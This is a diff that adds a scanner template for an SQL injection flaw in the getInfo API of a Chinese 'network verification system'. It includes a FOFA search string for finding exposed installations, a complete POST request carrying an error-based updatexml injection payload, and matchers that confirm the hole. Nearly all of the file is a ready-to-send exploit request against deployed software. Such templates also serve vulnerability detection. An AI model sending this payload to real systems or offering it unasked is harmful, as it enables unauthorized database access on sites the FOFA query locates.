@@ -1,0 +1,28 @@
+## id: VEID-2024-0502
+## name: 网络验证系统getInfo参数存在SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2024
+## description: 网络验证系统getInfo参数存在SQL注入漏洞。
+## fofa-query: body="zhuya/js/base.js"
+## verification: true
+
+
+POST /index.php/api/Software/getInfo HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+data=123456&id=1 and updatexml(1,concat(0x7e,md5(2),0x7e),1)
+
+
+
+#@ condition: and
+#@ matcher: body contains "c81e728d9d4c2f636f067f89cc14862"
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: dd6b772139cd5eb32c4907ef906acef7f14c2393f349889ce9db886c226b8900
